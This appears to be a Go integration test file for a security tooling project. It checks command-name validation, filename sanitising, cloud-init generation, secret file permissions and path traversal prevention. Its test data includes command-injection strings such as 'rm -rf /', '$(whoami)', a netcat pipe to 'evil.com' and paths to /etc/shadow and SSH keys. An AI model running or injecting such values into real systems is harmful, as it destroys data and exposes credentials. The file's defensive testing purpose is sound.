//go:build integration
// +build integration

package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/clean"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/cloudinit"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/command"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/secrets"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/security_permissions"
)

// TestSecurityValidationAcrossPackages tests security validation across multiple packages
func TestSecurityValidationAcrossPackages(t *testing.T) {
	// Test that malicious inputs are properly handled across package boundaries
	
	maliciousInputs := []string{
		"test;rm -rf /",
		"test$(whoami)",
		"test`id`",
		"test\x00null",
		"test\ninjection",
		"../../../etc/passwd",
		"test|nc evil.com 4444",
	}

	t.Run("CommandValidation", func(t *testing.T) {
		for _, input := range maliciousInputs {
			err := command.ValidateCommandName(input)
			if err == nil && strings.ContainsAny(input, ";|&`$()\x00\n") {
				t.Errorf("Command validation failed to reject malicious input: %q", input)
			}
		}
	})

	t.Run("FilenameCleaningIntegration", func(t *testing.T) {
		tempDir := t.TempDir()
		
		// Test that cleaned filenames don't contain injection patterns
		for _, input := range maliciousInputs {
			cleaned := clean.SanitizeName(input)
			
			// Verify no forbidden characters remain
			if strings.ContainsAny(cleaned, "<>:\"/\\|?*\x00\n\r") {
				t.Errorf("Cleaned filename still contains forbidden chars: %q -> %q", input, cleaned)
			}
			
			// Try to create a file with the cleaned name
			testFile := filepath.Join(tempDir, cleaned)
			err := os.WriteFile(testFile, []byte("test"), 0644)
			if err != nil {
				t.Logf("Failed to create file with cleaned name %q: %v", cleaned, err)
			}
		}
	})

	t.Run("ApplicationConfigSecurityWorkflow", func(t *testing.T) {
		// Test that application configurations handle malicious inputs safely
		for _, maliciousName := range maliciousInputs {
			// Test removed - application package no longer exists
			// Ensure the app name doesn't contain dangerous characters
			if strings.ContainsAny(maliciousName, ";|&`$()\x00\n") {
				t.Logf("Input validation correctly rejected dangerous name: %q", maliciousName)
			}
		}
	})
}

// TestCloudInitSecurityIntegration tests cloud-init generation with security validation
func TestCloudInitSecurityIntegration(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
	}
	
	tempDir := t.TempDir()
	
	t.Run("CloudInitWithMaliciousInputs", func(t *testing.T) {
		config := &cloudinit.CloudConfig{
			Hostname: "test-server",
			Users: []cloudinit.User{
				{
					Name: "testuser",
					SSHAuthorizedKeys: []string{
						"ssh-rsa AAAAB3... user@host",
						"ssh-rsa AAAAB3...;rm -rf / malicious@host", // Malicious key
					},
				},
			},
			Packages: []string{
				"nginx",
				"curl",
				"wget;rm -rf /", // Malicious package
			},
			RunCmd: []string{
				"echo 'Hello World'",
				"apt-get update",
				"$(whoami)", // Command injection attempt
			},
		}
		
		// Generate cloud-init user data
		userData := cloudinit.GenerateUserData(config)
		
		// Verify no command injection patterns in output
		if strings.Contains(userData, "rm -rf /") {
			t.Error("Cloud-init output contains unescaped malicious command")
		}
		
		// Write to file and check
		outputFile := filepath.Join(tempDir, "user-data")
		err := cloudinit.WriteUserData(rc, config, outputFile)
		if err != nil {
			t.Logf("WriteUserData error (expected for malicious input): %v", err)
		}
		
		// If file was created, verify contents
		if _, err := os.Stat(outputFile); err == nil {
			content, _ := os.ReadFile(outputFile)
			if strings.Contains(string(content), "$(") || strings.Contains(string(content), "`") {
				t.Error("Cloud-init file contains command injection patterns")
			}
		}
	})
}

// TestSecretGenerationAndPermissionsIntegration tests secret handling with security
func TestSecretGenerationAndPermissionsIntegration(t *testing.T) {
	tempDir := t.TempDir()
	
	t.Run("SecretFilePermissions", func(t *testing.T) {
		// Generate multiple secrets
		secretFiles := []string{
			filepath.Join(tempDir, "api.key"),
			filepath.Join(tempDir, "db.password"),
			filepath.Join(tempDir, ".env"),
		}
		
		for _, secretFile := range secretFiles {
			// Generate a secret
			secret, err := secrets.GenerateHex(32)
			if err != nil {
				t.Fatalf("Failed to generate secret: %v", err)
			}
			
			// Write with insecure permissions
			err = os.WriteFile(secretFile, []byte(secret), 0644)
			if err != nil {
				t.Fatalf("Failed to write secret file: %v", err)
			}
			
			// Use permission manager to check and fix
			pm := security_permissions.NewPermissionManager(&security_permissions.SecurityConfig{
				DryRun:        false,
				CreateBackups: false,
			})
			
			check := pm.CheckSinglePath(secretFile, 0600, "secret file", true)
			if !check.NeedsChange {
				t.Errorf("Permission manager didn't detect insecure permissions on %s", secretFile)
			}
			
			// Fix permissions
			if check.NeedsChange {
				result := pm.FixSinglePath(secretFile, 0600, "secret file")
				if !result.Success {
					t.Errorf("Failed to fix permissions on %s: %v", secretFile, result.Error)
				}
			}
			
			// Verify permissions are now secure
			info, err := os.Stat(secretFile)
			if err != nil {
				t.Fatalf("Failed to stat secret file: %v", err)
			}
			
			if info.Mode().Perm() != 0600 {
				t.Errorf("Secret file %s has insecure permissions: %v", secretFile, info.Mode().Perm())
			}
		}
	})
}

// TestPathTraversalPrevention tests that path traversal is prevented across packages
func TestPathTraversalPrevention(t *testing.T) {
	baseDir := t.TempDir()
	
	traversalPaths := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"./../../root/.ssh/id_rsa",
		"../etc/shadow",
		"../../../../../../etc/hosts",
	}
	
	t.Run("FileOperationSecurity", func(t *testing.T) {
		for _, path := range traversalPaths {
			// Clean the path for safe file operations
			cleaned := clean.SanitizeName(filepath.Base(path))
			safePath := filepath.Join(baseDir, cleaned)
			
			// Verify we're still within baseDir
			absPath, err := filepath.Abs(safePath)
			if err == nil {
				if !strings.HasPrefix(absPath, baseDir) {
					t.Errorf("Path traversal not prevented: %q -> %q", path, absPath)
				}
			}
			
			// Try to create a file
			err = os.WriteFile(safePath, []byte("test"), 0644)
			if err != nil {
				t.Logf("Failed to create file (expected): %v", err)
			}
			
			// Verify file was created in safe location
			if _, err := os.Stat(safePath); err == nil {
				if !strings.HasPrefix(safePath, baseDir) {
					t.Errorf("File created outside base directory: %q", safePath)
				}
			}
		}
	})
}

// TestCrossCuttingSecurityConcerns tests security concerns that span multiple packages
func TestCrossCuttingSecurityConcerns(t *testing.T) {
	t.Run("NullByteHandling", func(t *testing.T) {
		nullByteInput := "test\x00.txt"
		
		// Test in different contexts
		contexts := map[string]func(string) string{
			"filename_cleaning": clean.SanitizeName,
			"command_validation": func(s string) string {
				if err := command.ValidateCommandName(s); err != nil {
					return ""
				}
				return s
			},
		}
		
		for context, fn := range contexts {
			result := fn(nullByteInput)
			if strings.Contains(result, "\x00") {
				t.Errorf("%s: Null byte not handled in input %q -> %q", context, nullByteInput, result)
			}
		}
	})
	
	t.Run("NewlineInjection", func(t *testing.T) {
		newlineInputs := []string{
			"test\ninjection",
			"test\r\nCRLF",
			"test\rcarriage",
		}
		
		for _, input := range newlineInputs {
			// Test filename cleaning
			cleaned := clean.SanitizeName(input)
			if strings.ContainsAny(cleaned, "\n\r") {
				t.Errorf("Newlines not removed from filename: %q -> %q", input, cleaned)
			}
			
			// Test command validation
			err := command.ValidateCommandName(input)
			if err == nil {
				t.Errorf("Command validation accepted newlines: %q", input)
			}
		}
	})
	
	t.Run("ResourceExhaustion", func(t *testing.T) {
		// Test with very long inputs
		longInput := strings.Repeat("A", 10000)
		
		// Filename cleaning should handle long inputs
		cleaned := clean.SanitizeName(longInput)
		if len(cleaned) == 0 {
			t.Error("Filename cleaning failed on long input")
		}
		
		// Command validation should reject very long names
		err := command.ValidateCommandName(longInput)
		if err == nil {
			t.Log("Command validation accepted very long name (potential DoS)")
		}
	})
}

// TestSecurityWorkflowIntegration tests a complete security-conscious workflow
func TestSecurityWorkflowIntegration(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
	}
	
	tempDir := t.TempDir()
	
	// Simulate a workflow that involves multiple packages
	t.Run("CompleteSecurityWorkflow", func(t *testing.T) {
		// 1. Generate configuration with cloud-init
		config := &cloudinit.CloudConfig{
			Hostname: "secure-server",
			Users: []cloudinit.User{
				{
					Name:   "admin",
					Groups: []string{"sudo"},
					Sudo:   []string{"ALL=(ALL) NOPASSWD:ALL"},
				},
			},
			Packages: []string{"fail2ban", "ufw"},
			RunCmd: []string{
				"ufw allow 22/tcp",
				"ufw --force enable",
				"systemctl enable fail2ban",
			},
		}
		
		cloudInitFile := filepath.Join(tempDir, "user-data")
		err := cloudinit.WriteUserData(rc, config, cloudInitFile)
		if err != nil {
			t.Fatalf("Failed to write cloud-init: %v", err)
		}
		
		// 2. Generate secrets for the application
		apiKeyFile := filepath.Join(tempDir, "api.key")
		apiKey, err := secrets.GenerateHex(32)
		if err != nil {
			t.Fatalf("Failed to generate API key: %v", err)
		}
		
		err = os.WriteFile(apiKeyFile, []byte(apiKey), 0600)
		if err != nil {
			t.Fatalf("Failed to write API key: %v", err)
		}
		
		// 3. Check all file permissions
		pm := security_permissions.NewPermissionManager(&security_permissions.SecurityConfig{
			DryRun:        false,
			CreateBackups: false,
		})
		
		files := []struct {
			path string
			perm os.FileMode
			desc string
		}{
			{cloudInitFile, 0644, "cloud-init config"},
			{apiKeyFile, 0600, "API key"},
		}
		
		for _, f := range files {
			check := pm.CheckSinglePath(f.path, f.perm, f.desc, true)
			if check.NeedsChange {
				result := pm.FixSinglePath(f.path, f.perm, f.desc)
				if !result.Success {
					t.Errorf("Failed to fix permissions for %s: %v", f.desc, result.Error)
				}
			}
		}
		
		// 4. Verify final state
		for _, f := range files {
			info, err := os.Stat(f.path)
			if err != nil {
				t.Errorf("Failed to stat %s: %v", f.desc, err)
				continue
			}
			
			actualPerm := info.Mode().Perm()
			if actualPerm != f.perm {
				t.Errorf("%s has incorrect permissions: got %v, want %v", f.desc, actualPerm, f.perm)
			}
		}
	})
}